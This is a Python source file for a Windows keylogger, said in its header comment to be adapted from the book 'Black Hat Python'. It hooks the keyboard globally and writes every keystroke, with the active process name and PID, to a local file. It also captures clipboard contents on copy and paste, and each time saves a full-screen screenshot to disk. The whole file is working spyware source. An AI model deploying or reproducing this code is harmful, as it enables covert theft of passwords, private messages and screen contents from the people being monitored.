#I read Black Hat Python: Python Programming for Hackers and Pentesters by Justin Seitz 
# and I got a lot of  ideas and several code snippets from this book, which I modified
# and changed and expanded upon, etc.

from ctypes import *
import pythoncom
import pyHook
import win32clipboard
import win32gui
import win32ui
import win32con
import win32api
from datetime import datetime

user32 = windll.user32
kernel32 = windll.kernel32
psapi = windll.psapi
current_window = None
data=''
datime=''

def saveIt():
    
    global data
    fp=open("temp.txt","a")
    fp.write(data)
    fp.close()
    data=''
    

def get_current_process():
    hwnd = user32.GetForegroundWindow()
    pid = c_ulong(0)
    user32.GetWindowThreadProcessId(hwnd, byref(pid))
    process_id = "%d" % pid.value
    executable = create_string_buffer("\x00" * 512)
    h_process = kernel32.OpenProcess(0x400 | 0x10, False, pid)
    psapi.GetModuleBaseNameA(h_process,None,byref(executable),512)  
    window_title = create_string_buffer("\x00" * 512)
    length = user32.GetWindowTextA(hwnd, byref(window_title),512)
        
    data =  "\n[ %s - PID: %s]\n" % (executable.value, process_id)    
    print data
    fp=open("temp.txt","a")
    fp.write(data)
    fp.close()
    
    kernel32.CloseHandle(hwnd)
    kernel32.CloseHandle(h_process)
    
def KeyStroke(event):
    global data
    global datime
    global current_window
    if event.WindowName != current_window:
        current_window = event.WindowName
        get_current_process()
    if event.Ascii > 32 and event.Ascii < 127:
        data = chr(event.Ascii)
        print data
        saveIt()
             
    elif event.Ascii == 32:
        data = " "
        saveIt()
    else:       
        if event.Key == "V":
            win32clipboard.OpenClipboard()
            pasted_value = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            Timey()
            data = "([ctlr-v] - %s at %s)" % (pasted_value, datime)
            print data
            saveIt()
            cap()
        if event.Key == "C":
                    win32clipboard.OpenClipboard()
                    copied_value = win32clipboard.GetClipboardData()
                    win32clipboard.CloseClipboard()
                    Timey()
                    data = "([ctlr-c] - %s at %s)" % (copied_value, datime)
                    print data
                    saveIt()
                    cap()        
        else:
            print "[%s]" % event.Key,
            data = "[%s]" % event.Key
            saveIt()

    
    return True

def Timey():
    global datime
    datime = str(datetime.now())
      
def cap():
    global datime
    hdesktop = win32gui.GetDesktopWindow()
    width = win32api.GetSystemMetrics(win32con.SM_CXVIRTUALSCREEN)
    height = win32api.GetSystemMetrics(win32con.SM_CYVIRTUALSCREEN)
    left = win32api.GetSystemMetrics(win32con.SM_XVIRTUALSCREEN)
    top = win32api.GetSystemMetrics(win32con.SM_YVIRTUALSCREEN)
    desktop_dc = win32gui.GetWindowDC(hdesktop)
    img_dc = win32ui.CreateDCFromHandle(desktop_dc)
    mem_dc = img_dc.CreateCompatibleDC()
    screenshot = win32ui.CreateBitmap()
    screenshot.CreateCompatibleBitmap(img_dc, width, height)
    mem_dc.SelectObject(screenshot)
    mem_dc.BitBlt((0, 0), (width, height), img_dc, (left, top), win32con.SRCCOPY)
    Timey()
    new_str = datime.replace(':', '-') 
    location = 'c:\\0\\screenshot'
    location = location + new_str
    location = location + ".bmp"
    screenshot.SaveBitmapFile(mem_dc, location)
    mem_dc.DeleteDC()
    win32gui.DeleteObject(screenshot.GetHandle())    

#end
kl = pyHook.HookManager()
kl.KeyDown = KeyStroke
kl.HookKeyboard()
pythoncom.PumpMessages()
